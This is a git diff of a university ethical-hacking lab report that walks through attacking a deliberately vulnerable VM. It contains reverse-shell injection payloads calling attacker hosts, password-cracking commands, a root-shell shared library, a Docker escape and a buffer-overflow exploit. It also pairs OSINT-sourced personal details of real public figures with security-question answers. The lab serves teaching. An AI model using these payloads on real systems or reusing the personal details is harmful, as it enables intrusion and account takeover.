@@ -5,7 +5,7 @@ Ethical Hacking Lab Assignment
  
 Virtual machine design and report<br/>
 <b>
-Group <code>0xe</code> - Salvatore Busiello, Nicholas Montana, Alex Parri
+Group <code>0xe</code> - Owanesh, zBION1C, Frayu1600
 </b><br/>
 *vC0rp* Virtual Machine
 </center>
@@ -33,13 +33,13 @@ We were instructed to design a virtual machine (VM) containing deliberate vulner
 
 # Machine specifications
 ## Context
-vC0rp presents itself as a company that cares about veganism and the environment. They run a popular blog called "The Green Crusaders" which talks about being vegan and saving the planet.
+`vC0rp` presents itself as a company that cares about veganism and the environment. They run a popular blog called "The Green Crusaders" which talks about being vegan and saving the planet.
 
-But here's the twist: secretly, vC0rp is involved in something shady. Behind the scenes, they're actually a big part of the illegal meat trade. While they preach about being kind to animals and the environment, they're making money from selling meat on the black market!
+But here's the twist: secretly, `vC0rp` is involved in something shady. Behind the scenes, they're actually a big part of the illegal meat trade. While they preach about being kind to animals and the environment, they're making money from selling meat on the black market!
 
 In their offices, top bosses are always coming up with sneaky plans to keep their illegal business going. They bend the rules and bribe people to stay under the radar. It's a two-faced operation – they say one thing in public but do the opposite in private.
 
-As their secret starts to leak out, vC0rp finds itself in big trouble. Will they be exposed for their lies, or will they keep getting away with their deceitful actions?
+As their secret starts to leak out, `vC0rp` finds itself in big trouble. Will they be exposed for their lies, or will they keep getting away with their deceitful actions?
 
 ## Machine overview
 The machine runs an `nginx` web server that hosts The Green Crusaders blog. This blog presents vulnerabilities such as cross site scripting, command injection and other poor security policies that can be exploited by an attacker to gain remote access. 
@@ -49,7 +49,7 @@ There are three users registered on the blog, being:
 - **Giorgio Immesi** aka `ilveganoimbruttito`, blog author
 - **Matteo Ricci**, a member of the staff, is currently organizing a protest.
   
-The machine also runs an ftp server which contains an interesting sql backup. 
+The machine also runs an `ftp` server which contains an interesting sql backup. 
 
 Behind the scenes, the server runs another web server hosting an *hidden* web service for the trade of meat. This web service is placed inside docker for security reasons and is **not an easy target**. 
 
@@ -57,10 +57,10 @@ There are also some command line interface programs in the server's file system 
 
 Below is shown a diagram of the machine with all the services running and a brief description on how to attack them:
 
-![Machine diagram](images/diagram.jpg)
+![Machine diagram](images/diagram.png)
 
 # Obtaining remote access
-First things first, when a penetration tester has a machine, the first thing they should do is scanning, therefore we run a quick and easy `nmap` towards the machine itself
+First things first, when a penetration tester has a machine, they should do scanning, therefore we run a quick and easy `nmap` towards the machine itself
 ```sh
 $ nmap -sS -O <machine_ip>
 ```
@@ -90,25 +90,48 @@ Now we have every single ingredient for our remote access adventure, of which we
 ## 🟢 Easy path
 From the scanning, we can notice that there is an ftp server (port 21) running. We should also notice by probing the authentication mechanism of the ftp server that it allows anonymous authentication
 ```sh
-$ ftp <machine_ip>
+ftp <machine_ip>
 ```
 The landing directory will contain two files called `leavemehere.txt`, which contains some information for the login page, and the `sql_backup.zip` that contains the user table backup of the vegan blog. 
 
+
 We have to download the backup 
 ```sh
-$ get sql_backup.zip 
+get sql_backup.zip 
 ```
-and read the clear-text credentials from it to login.
+The `sql_backup.zip` has a password required to extract informations. To obtain this password we can use `johntheripper` swiss-knife with the module `zip2john`
 
-In this backup there is only one user currently active in the blog and is Matteo Ricci. We can now login as Matteo Ricci, a not so expert staff member of vC0rp. He is currently organizing a protest and published the private key of the server! 
+After that, with a common wordlist (rockyou is enough) we can read the clear-text credentials from it.
+
 ```sh
-$ ssh saltbae@<machine_ip>
+zip2john sql_backup.zip > zip.hash
+
+john --wordlist=/rockyou.txt zip.hash
+```
+
+In this backup there is only one user currently active in the blog and is Matteo Ricci.
+
+![](images/tgc/login.png)
+
+We can now login as Matteo Ricci, a not so expert staff member of `vC0rp`. He is currently organizing a protest and published the private key of the server! 
+
+![](images/tgc/matteo_profile.png)
+
+```sh
+chmod 600 ./downloaded_id_rsa
+```
+```sh
+ssh matteo@your.vm.vcorp.ip -i ./downloaded_id_rsa
 ```
 This private key can be used to login with ssh on the machine.
 
 ## 🟠 Medium path 
 
-As previously said, vC0rp runs a popular blog, "The Green Crusaders", which can be accessed at `/blog` 
+As previously said, `vC0rp` runs a popular blog, "The Green Crusaders",
+
+![Green crusaders homepage](images/tgc/home.png)
+
+Articles can be accessed at `/blog` on port `:80` 
 
 ![The Green Crusaders Blog](images/tgc/blog.png)
 
@@ -116,7 +139,7 @@ The blog will contain articles centered around veganism and such. We can see tha
 1. Fabiola di Sotto
 2. Giorgio Immesi
    
-Let’s inform ourselves about veganism a little more by checking any blog post, for instance:
+Let’s gather some juicy information by enumerate usernames by checking any blog post, for instance:
 ```sh
 /blog/compassionate-future-rethinking-relationship-food-nature
 ```
@@ -128,9 +151,10 @@ Let’s click onto the name of the author itself, in this case Giorgio Immesi, w
 ```sh
 /blog/author/ilveganoimbruttito
 ```
+![Green Crusader Author page](images/tgc/medium/author_page.png)
 So far, we’ve understood that his username is `ilveganoimbruttito` he is a post author. Now we could try to ask for a password reset, using above username, which will succeed in Step 1.
 
-Then, as Step 2, we will get asked 3 security questions… which we will have to answer all:
+Then, as Step 2, we will get asked 3 security questions… which we will have to answer all (for example):
 1. `Which year have you become vegan?`
 2. `Which day were you born?`
 3. `In which town have you attended elementary school?`
@@ -143,9 +167,12 @@ Well, we can try googling Giorgio Immesi, and from a very quick search we can no
 Famous people usually tend to leave *too much* information about their life online… will this be their demise in this case?
 
 Indeed, because we can answer all three questions with a little bit of **OSINT** work: 
-1. [‘PERCHE' SONO VEGANO : Tutta la VERITA' - Video di Giorgio Immesi’](https://www.youtube.com/watch?v=EXITzZ9L5xI&t=440s) - Answer: `2015`
-2. [‘TUTTA la MIA VITA in 8 MINUTI - Vlog di Giorgio Immesi’](https://www.youtube.com/watch?v=IuCCZJRuq2M&t=45s) - Answer: `10th December`
-3. [‘TUTTA la MIA VITA in 8 MINUTI - Vlog di Giorgio Immesi’](https://www.youtube.com/watch?v=IuCCZJRuq2M&t=159s) - Answer: `Santilario`
+1. [‘PERCHE' SONO VEGANO : Tutta la VERITA' - Video di Giorgio Immesi’](https://www.youtube.com/watch?v=EXITzZ9L5xI&t=440s) 
+   -  Answer: `2015`
+2. [‘TUTTA la MIA VITA in 8 MINUTI - Vlog di Giorgio Immesi’](https://www.youtube.com/watch?v=IuCCZJRuq2M&t=45s)
+   - Answer: `10th December`
+3. [‘TUTTA la MIA VITA in 8 MINUTI - Vlog di Giorgio Immesi’](https://www.youtube.com/watch?v=IuCCZJRuq2M&t=159s)
+   - Answer: `Santilario`
 
 By inputting the above answers, we will get output the hash of the password, which is the following string
 ```sh
@@ -157,15 +184,15 @@ ilveganoimbruttito@greencrusaders.0xe
 ```
 Now we check which kind of algorithm output the above hash, which can be done with any online or offline tool, in this case we can use `hash-identifier` in the following way:
 ```sh
-$ hash-identifier 78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46
+hash-identifier 78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46
 ```
 We will get told that the most probable candidate is SHA256, which is pretty secure… right?
 ![Hash identifier](images/tgc/medium/kali_hash_identifier.png)
 
 You never know until you try it, we can try to crack it by using any password cracking tool like **JohnTheRipper** or **hashcat**, in this case we will use the Ripper, while using the `rockyou` wordlist and specifying that it is a SHA256 digest:
 ```sh
-$ echo "78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46" > tgc_user_pass.txt
-$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 tgc_user_pass.txt 
+echo "78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46" > tgc_user_pass.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 tgc_user_pass.txt 
 ```
 Bingo!
 
@@ -178,9 +205,29 @@ password: 4everlove
 ```
 And we’re in as blog author!
 
-**Note**: the same could be done with blog author ‘Fabiola di Sotto’, whose username is `vegmamy`. In her case, everything is available on her Instagram account.
+**Note**: the same could be done with blog author "Fabiola di Sotto", whose username is `vegmamy`. In her case, everything is available on her Instagram account.
 
+For completion we add source of information and q&a.
+```json
+{
+  "question": "What month was your first child born?",
+  "correctAnswer": "March",
+  "source": "https://www.facebook.com/fabiolavegmamy/photos/pb.100063526240710.-2207520000/207439207837009/?type=3"
+},
+{
+  "question": "What month did you get married?",
+  "correctAnswer": "September",
+  "source": ["https://www.facebook.com/photo/?fbid=794693622658172&set=pb.100063526240710.-2207520000", "https://www.instagram.com/p/CiCO8jCvK1_/"]
+},
+{
+  "question": "What month has your brother gotten married?",
+  "correctAnswer": "December",
+  "source": "https://www.instagram.com/p/CXbXTKugxQJ/"
+}
+
+```
 Once entered as author of the blog, from the bottom of the profile page of the user we can access the `/YWRtaW4K/dashboard` which displays info on the posts of the user. 
+
 
 ![Author’s dashboard](images/tgc/medium/user_dashboard.png)
 
@@ -196,7 +243,7 @@ There seems not to be any kind of filtering applied to it, after all, we are tru
 
 Therefore, we get a reverse shell from it by injecting the following bash command
 ```sh
-"; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("your.attacker.ip.address",attacker_port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' # 
+"; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("your.attacker.machine.ip",attacker_port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' # 
 ```
 ## 🔴 Hard path
 To exploit the hard path we have to take the same steps of the medium path, so we have to be logged in as an author of the blog (any). As an author of the blog, we can publish posts from the `/YWRtaW4K/new-article` page
@@ -253,8 +300,6 @@ If we interrogate this API with the OPTIONS method of HTTP we discover the metho
 This API is under development and the developers are experimenting with some HTTP methods. Indeed if we send the image to the API with a POST 
 request the check is done correctly and the filename is sanitized. 
 
-![POST API check](images/tgc/hard/admin_api_analysis.png)
-
 However the developers are currently implementing a new and more robust check and they are testing it using the PUT method, so that the current POST method check remains usable.
 
 ![PUT API check](images/tgc/hard/admin_api_analysis_2.png)
@@ -262,7 +307,7 @@ However the developers are currently implementing a new and more robust check an
 If we submit the file to the API but with a PUT request the API will not sanitize the filename and this will lead to remote command execution!
 If we inject the following payload
 ```sh
-{"filename":"\"; python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"192.168.1.142\",9321));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")' #"}
+{"filename":"\"; python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"your.attacker.machine.ip\",attacker_port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")' #"}
 
 ```
 ![Burpsuite filename payload](images/tgc/hard/admin_api_exploit.png)
@@ -285,6 +330,7 @@ There is no check on the integrity of the `shadow-butchers-premium.so` so the at
 
 ```c
 #include <stdlib.h>
+#include <stdio.h>
 #include <unistd.h>
 static void inject()
 __attribute__((constructor));
@@ -294,7 +340,7 @@ void inject() {
 }
 // Optional
 int sell() {
-  printf("You are not selling anything today sir!")
+  printf("You are not selling anything today sir!");
 }
 ```
 Once the above file is compiled with
@@ -304,20 +350,40 @@ gcc --shared -m32 -fPIC -o shadow-butchers-premium.so shadow-butchers-premium.c
 The attacker has to execute the `shadow-butchers-client` and has to select the *sell* option. Since this option was overwritten it will spawn a root shell.
 
 ## 🟠 Medium path
-Once we have remote access to the machine, we could start to enumerate it. The enumeration process led us to a hidden web service running on a docker container listening on localhost. Accessing the website is not an easy task. Since it is listening on localhost we must do some tunneling. One way to do this is with ssh port forwarding like this:
-```sh
-ssh -L 9090:localhost:3100 saltbae@192.168.1.151 -i id_rsa
-```
-To do this though we need the private ssh key which we already have (if we traversed the easy path) or we could just simply create another pair. After that we contact `localhost:9090` and we are greeted with a meat store! vC0rp must be into some shady things…
+Once we have remote access to the machine, we could start to enumerate it. The enumeration process led us to a hidden web service running on a docker container listening on localhost. 
 
-We start to play with the website until we find the `/resellers` page. This page presents a search bar used to find meat resellers in the world. This search bar presents yet another command injection vulnerability. With the following payload we spawn a reverse shell:
+First thing to do to visit the website is a Local Port Forwarding as follows
 ```sh
-“; nc <attacker_machine>:<port> -e /bin/sh %23
+ssh -L 9090:localhost:3100 [matteo|saltbae]@vuln_machine_ip -i /downloaded_id_rsa
 ```
-Once we enter things seem a little odd… We realize that we are not in the system, but in a container, a privileged container! We can mount the server's filesystem on the docker container and act as the root of the server:
+In this way we open a port 9090 on our attacker machine.
+This step is necessary because port 3100 is blocked by outside 
+```sh
+curl vulnerable_machine_ip:3100
+>> curl: (7) Failed to connect to vulnerable_machine_ip port 3100 after 2 ms: Couldn't connect to server
+```
+![Shadow Butcher Homepage](images/shadow/home.png)
+
+We start to play with the website until we find the `/resellers` page. This page presents a search bar used to find meat resellers in the world.
+![](images/tgc/hard/reseller_rce.png)
+ This search bar presents yet another command injection vulnerability. With the following payload we spawn a reverse shell:
+```sh
+“; nc 192.168.1.142 9321 -e /bin/ash %23
+```
+Once we enter we can notice that we are running into a different Linux version than normal. And analyzing running processes something is familiar for who has already used docker.
+
+We realize that we are not in the system, but in a container, a privileged container! 
+
+
+> this is possible because docker is runned with the following command
+> `docker run -d --pid=host -v /:/host/ --privileged -p 3100:3100 --restart unless-stopped nextjs-docker`
+> allowing also `capsh --print` attack
+> 
+We can mount the server's filesystem on the docker container and act as the root of the server:
 ```sh
 chroot /host sh
 ```
+![](images/shadow/shell_escape.png)
 
 ## 🔴 Hard path
 The same `shadow-butchers-client` executable in the *saltbae* home is vulnerable to a buffer overflow. The buffer overflow is exploitable from the *order meat from suppliers* option. The program will ask the user to input the name of the supplier he wants to buy the meat from. This string is copied to a buffer without checking the length. Since the machine does not have ASLR active and the executable was compiled with executable stack and with no canaries the exploitation is pretty straight forward.
@@ -351,4 +417,19 @@ io.interactive()
 This indeed spawns a root shell.
 
 # How it's made - Machine
-Here we will say how the machine was built
+
+The recipe for this system comprises several key ingredients:
+
+1. **Ansible**: Employed for scripting and orchestrating the setup and management of services. Ansible facilitates the seamless configuration and deployment of infrastructure components.
+
+2. **Docker**: Utilized for containerization, enabling the encapsulation of services into lightweight, portable containers. Docker enhances scalability, efficiency, and consistency in deploying and running applications across different environments.
+
+3. **NextJS**: The backbone of various services, implemented as custom NextJS (v14) projects. NextJS, with its robust capabilities for building server-side rendered and static websites, powers the core functionality of the system's web applications. (Typescript and TailwindCSS used)
+
+4. **C (and Binary Exploitation Knowledge)**: Applied for crafting custom binaries that can be executed by users. Proficiency in C, coupled with expertise in binary exploitation techniques, ensures the development of tailored executables that uphold user accessibility and system security.
+
+Custom NextJS projects are deployed, with one served via Nginx as a reverse proxy and another encapsulated within Docker containers. Ansible streamlines the entire process, from provisioning infrastructure to managing service deployment, ensuring efficiency and consistency throughout the system's lifecycle.
+
+
+Entire source code is available on [GitHub](https://github.com/Owanesh/ETH2324)
+
